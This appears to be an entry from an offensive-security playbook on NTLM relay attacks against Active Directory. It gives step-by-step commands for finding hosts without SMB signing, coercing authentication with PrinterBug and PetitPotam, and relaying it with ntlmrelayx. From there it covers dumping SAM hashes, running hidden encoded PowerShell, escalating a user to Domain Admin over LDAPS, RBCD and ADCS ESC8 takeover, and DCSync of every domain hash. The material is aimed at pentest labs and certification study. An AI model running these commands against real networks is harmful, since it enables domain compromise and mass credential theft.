title: NTLM Relay — Forwarding Captured Authentication to a Target
body:
NTLM relay is one of the most powerful techniques in modern AD attacks because it bypasses password cracking entirely. Instead of capturing a hash and cracking it offline, you forward the live authentication session to a target that doesn't enforce SMB signing, and ride that session for as long as it stays valid.

The attacker doesn't see the password. They don't need to. They just see access to the relayed target as the principal that authenticated.

— THE CONCEPT IN ONE SENTENCE —

  Victim authenticates to attacker → attacker forwards that auth to a
  third-party target that accepts it → attacker now has access to the third
  party AS the victim, without ever seeing or cracking the password.

— WHAT'S REQUIRED FOR RELAY TO WORK —

  1. A way to coerce or capture authentication (forced auth, broadcast
     poisoning, malicious URI file, etc.)
  2. A relay target where SMB or LDAPS signing is NOT required
  3. Network reachability from your Kali to the relay target
  4. The principal whose auth you're relaying must have meaningful access
     on the relay target (workstation admin, server admin, etc.)

— THE SIGNING REQUIREMENT — THE CRITICAL CHECK —

  Every Windows host has signing settings on each protocol:

  SMB SIGNING:
    Required → relay impossible (auth is rejected at the relay target)
    Enabled (optional) → relay works if client also has signing optional
    Disabled → relay works

  LDAP SIGNING & CHANNEL BINDING:
    Required → relay impossible
    Negotiate → relay works if client doesn't request signing
    Channel binding required → relay impossible to LDAPS

  Windows defaults:
    Domain controllers: SMB signing REQUIRED — cannot relay TO a DC's SMB
    Domain controllers: LDAP signing varies — often relay-able to LDAPS
    Member servers: SMB signing OPTIONAL — usually relay-able
    Workstations: SMB signing OPTIONAL — usually relay-able

— THE ATTACK CHAIN — STEP BY STEP —

  1. ENUMERATE — find relay targets (machines with signing not required)
     nxc smb $subnet --gen-relay-list relay_targets.txt
     Each line in relay_targets.txt is a machine you can relay to.

  2. CONFIGURE — kill Responder's SMB/HTTP listeners (so relay sees the auth)
     /etc/responder/Responder.conf: SMB = Off, HTTP = Off

  3. START RELAY — pick your relay target and your post-auth action
     impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

  4. TRIGGER — coerce or capture auth from a victim that has access on the target
     Coercion: PrinterBug, PetitPotam, DFSCoerce, ShadowCoerce
     Capture:  Responder broadcast poisoning, URI file in writable share

  5. RIDE — relay opens a session on the target as the victim
     Use SOCKS proxy (proxychains + any tool), execute commands, dump hashes,
     pivot, persist.

— RELAY TARGET ACCESS LEVEL —

  Relay only gives you what the relayed user has on the target.

  Helpdesk user → workstation:           limited (regular user access)
  Domain Admin → workstation:            local admin on workstation
  DC machine account → another DC LDAPS: full domain auth (DCSync possible)
  Server admin → server:                 local admin on server

  Relaying a low-privileged user gets you low-privileged access. The trick
  is finding HIGH-privileged users to coerce, then relaying their auth to
  high-value targets.

— RELAY TO LDAPS — THE DC COMPROMISE CHAIN —

  Most powerful relay variant. Requires:
    - LDAPS not enforcing channel binding
    - Coerced victim has rights on the domain (any DC machine account works)

  Chain:
    1. Coerce DC2 to authenticate to your Kali (PetitPotam to DC2)
    2. Relay DC2's auth to LDAPS on DC1
    3. As DC2$ via LDAPS, write to AD: add yourlowpriv to Domain Admins
       OR grant yourlowpriv DCSync rights
    4. Now yourlowpriv is DA — secretsdump and you're done

  Single command for the relay step:
    impacket-ntlmrelayx -t ldaps://dc1.domain.local --escalate-user yourlowpriv

— RELAY VS CAPTURE — WHEN TO USE WHICH —

  USE CAPTURE+CRACK WHEN:
    - The victim has admin password worth cracking (usually short, common)
    - All relay targets enforce signing (no viable relay paths)
    - You need persistent credentials (hashes for pass-the-hash later)
    - Lab boxes — passwords are usually crackable

  USE RELAY WHEN:
    - Password cracking would fail (long random password, gMSA, etc.)
    - You have a high-value relay target with signing not required
    - The auth session is short and won't repeat (one shot to use it)
    - Real engagements where time matters more than crackable creds

  USE BOTH WHEN POSSIBLE:
    - Run capture in one session, relay in another (different attack windows)
    - Capture gives you persistence; relay gives you immediate access
    - But never simultaneously on the same listener — port conflict
cmd:
# ── STEP 1: ENUMERATE — RELAY TARGETS ────────────────
# Find machines where SMB signing is NOT required
nxc smb $subnet --gen-relay-list /tmp/relay_targets.txt
wc -l /tmp/relay_targets.txt   # how many viable targets?

# More verbose — see signing status per host:
nxc smb $subnet 2>&1 | grep -i 'signing'
# Output legend:
#   signing:False = relay works
#   signing:True  = relay blocked

# Manual per-host check with smbclient:
smbclient -L //$ip -N 2>&1 | grep -i 'sign'

# Check LDAP signing on DCs (relay-to-LDAPS viability):
nxc ldap $dc_ip
# Look for: Channel Binding: <state>
# 'Never'   = relay works
# 'WhenSupported' = sometimes works
# 'Always'  = relay blocked

# Check LDAPS signing specifically:
python3 -c "import ldap3; s=ldap3.Server('$dc_ip', use_ssl=True); c=ldap3.Connection(s); c.bind(); print(c.result)"

# ── STEP 2: CONFIGURE RESPONDER FOR RELAY MODE ───────
# Edit /etc/responder/Responder.conf:
#   SMB = Off
#   HTTP = Off
# This is critical — Responder must NOT eat the auth before ntlmrelayx sees it
sudo nano /etc/responder/Responder.conf
# Or sed it inline:
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
grep -E '^SMB|^HTTP' /etc/responder/Responder.conf

# ── STEP 3A: BASIC RELAY — SOCKS PROXY ───────────────
# Most flexible — relay opens a SOCKS proxy on 1080, use proxychains for any tool
impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -socks
# Watch the output for successful relays:
#   [*] Authenticating against smb://target.domain.local as DOMAIN\user SUCCEED
#   [*] SOCKS: Adding domain\user@target.domain.local(445) to active SOCKS connection

# In another terminal, use the SOCKS proxy:
proxychains4 smbclient -U domain/user //target/C$
proxychains4 nxc smb target -u user -p 'unused' --shares
# (password 'unused' because we're authenticating via the relayed session)

# ── STEP 3B: RELAY → DUMP SAM HASHES ─────────────────
# When you don't need persistent access, just want the hashes
impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support \
  -of /tmp/sam_dumps/
# Each successful relay writes hashes to /tmp/sam_dumps/<target>.txt

# ── STEP 3C: RELAY → EXECUTE COMMAND ──────────────────
# Single command execution per relayed session
impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support \
  -e '/tmp/payload.bat'

# Or PowerShell payload directly:
impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support \
  -c 'powershell -nop -w hidden -enc <BASE64>'

# ── STEP 3D: RELAY → LDAPS — DC COMPROMISE ───────────
# The high-value relay. Coerce a DC, relay to another DC's LDAPS,
# escalate yourself or another low-priv user to DA.

impacket-ntlmrelayx -t ldaps://dc1.domain.local \
  --escalate-user yourlowpriv \
  --no-smb-server
# --escalate-user adds the named user to Domain Admins

# Or grant DCSync rights (cleaner — less obvious than DA membership):
impacket-ntlmrelayx -t ldaps://dc1.domain.local \
  --escalate-user yourlowpriv \
  --add-computer 'EVILPC$' \
  --no-smb-server

# Or directly DCSync via the relayed session (best — no AD changes):
# Use --shadow-credentials approach:
impacket-ntlmrelayx -t ldaps://dc1.domain.local \
  --shadow-credentials \
  --shadow-target 'targetuser' \
  --no-smb-server
# Outputs a certificate that can request TGTs as targetuser

# ── STEP 4: TRIGGER COERCION ──────────────────────────
# In yet another terminal, coerce the victim to authenticate to your Kali

# PrinterBug — works on most Server installs with spooler enabled
impacket-printerbug 'domain/user:pass'@$target_ip $kali_ip

# PetitPotam — works on most DCs (depending on patch level)
python3 PetitPotam.py -u user -p pass -d domain $kali_ip $dc_ip

# Anonymous PetitPotam (older DCs):
python3 PetitPotam.py -u '' -p '' $kali_ip $dc_ip

# Coercer.py — auto-tries every method:
python3 Coercer.py coerce -u user -p pass -d domain.local \
  -l $kali_ip -t $target_ip --analyze

# ── STEP 5: USE THE RELAYED SESSION ───────────────────
# Once ntlmrelayx logs a successful relay:

# If using -socks:
proxychains4 nxc smb target -u user -p '' --shares
proxychains4 impacket-secretsdump -no-pass user@target
proxychains4 evil-winrm -i target -u user -p ''

# If using -e or -c:
# Command already executed. Check your callback / listener.

# If using --escalate-user (LDAPS DA escalation):
# Verify domain admin status:
nxc smb $dc_ip -u yourlowpriv -p 'yourpass'
# Should now show (Pwn3d!) marker on DCs

# ── STEP 6: DCSync — FULL DOMAIN COMPROMISE ──────────
# After successful DA escalation:
impacket-secretsdump -just-dc-ntlm domain/yourlowpriv:yourpass@$dc_ip
# Captures every domain user NT hash + krbtgt

# ── ADVANCED: RBCD ATTACK CHAIN ──────────────────────
# Combines coercion + relay + machine account quota into full target takeover
# Pre-req: ms-DS-MachineAccountQuota > 0 (default = 10)

# 1. Add a fake computer account (uses your MAQ allotment)
impacket-addcomputer -computer-name 'EVIL$' \
  -computer-pass 'P@ssword123' \
  -dc-host $dc_ip \
  'domain/lowprivuser:pass'

# 2. Start relay configured for RBCD
impacket-ntlmrelayx -t ldaps://$dc_ip \
  --delegate-access \
  --escalate-user 'EVIL$' \
  --no-smb-server

# 3. Coerce target machine to authenticate to your Kali
impacket-printerbug 'domain/lowprivuser:pass'@$target_ip $kali_ip

# 4. Relay configures RBCD on target → EVIL$ can impersonate any user to target

# 5. Get a TGS as Administrator to target's CIFS service
impacket-getST -spn cifs/target.domain.local \
  'domain/EVIL$:P@ssword123' \
  -impersonate Administrator

# 6. Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.domain.local
warn:
RELAY TO ORIGINATING HOST FAILS — MS08-068 PATCH:
  You cannot relay machine A's auth back to machine A. The MS08-068 patch
  blocks this specific pattern (originally exploited by SMBRelay). Modern
  relay always requires a third-party target. Coerce A → relay to B → B is
  compromised. If A and B are the same machine, the auth is rejected.

NTLMv1 vs NTLMv2 — RELAY WORKS FOR BOTH BUT DIFFERENTLY:
  NTLMv2 sessions are tied to specific server challenges, but ntlmrelayx
  handles the proxy correctly. NTLMv1 (rare on modern domains) is even
  easier and works with broader tool support.
  Both crack offline if relay isn't viable, but NTLMv1 cracks in seconds
  via crack.sh rainbow tables.

SIGNING ENFORCEMENT IS THE WHOLE GAME:
  Modern Windows is increasingly forcing signing by default. Server 2025
  requires SMB signing on by default for the first time. LDAP channel
  binding is being aggressively pushed via Microsoft hardening guidance.
  Real engagements: assume signing is required somewhere and plan around it.
  Lab boxes: signing is usually not required — relay works.

RESPONDER + NTLMRELAYX MUTUAL EXCLUSION:
  These tools both want port 445 (and 80/443 for HTTP). Running both at
  once means whichever bound first eats every auth attempt. Symptom: relay
  shows nothing in logs while Responder happily logs hashes. Solution:
  /etc/responder/Responder.conf must have SMB = Off and HTTP = Off when
  using ntlmrelayx. Restart Responder for changes to apply.

SOCKS PROXY DOESN'T HOLD FOREVER:
  Relayed SOCKS sessions stay alive only as long as the underlying NTLM
  session is valid — typically 30 minutes idle, max 8 hours. Plan to
  re-coerce if you need long-running access. Or use -e/-c for one-shot
  immediate execution.

ESCALATE-USER NEEDS WRITE ACCESS ON THE DOMAIN:
  --escalate-user works only when the relayed principal has the AD rights
  to modify Domain Admins membership. DC machine accounts ($) typically do
  in default configurations. Regular user accounts typically do not.
  Match your coercion victim to your relay action — if you're relaying a
  workstation user's auth to LDAPS, --escalate-user will fail.

LDAPS SIGNING ENFORCEMENT IS STATE-DEPENDENT:
  LDAP channel binding settings have changed across Windows versions and
  patches. Some 2019/2022 DCs accept relay; others reject. The only way to
  know is to try. nxc ldap $dc_ip surfaces the policy where it's enforced
  but not always accurately. Test with a real relay attempt.

ADCS ESC8 — THE MODERN RELAY CHAIN:
  AD Certificate Services Web Enrollment (HTTP, port 80) is a high-value
  relay target. Many DCs have Web Enrollment enabled by default with no
  channel binding. Coerce the DC machine account → relay to ADCS HTTP
  endpoint → request a certificate as the DC$ → use that cert to
  authenticate as DC and DCSync.
  This is ESC8 in the Certify/Certipy taxonomy — search 'ADCS ESC8' for
  the canonical writeup. ntlmrelayx supports this directly:
    impacket-ntlmrelayx -t http://adcs.domain.local/certsrv/certfnsh.asp \
      --adcs --template DomainController

LAB BOX RELAY OFTEN IS THE PATH:
  PG Practice and OSCP exam boxes regularly include intentional relay paths
  — a workstation with signing disabled and a coerce-able service account.
  When you see SMB share + writable + multiple Windows hosts in scope,
  always check signing first with nxc. Relay is often faster than crack
  even on lab boxes.

choices.label: Got SOCKS proxy — pivot through it
Dumped SAM hashes — pass the hash
Got code execution on relayed target
Need to coerce — back to coercion overview
URI file is the trigger — drop it on a share
Need to find more relay targets — back to enum
Got admin — full domain compromise reached
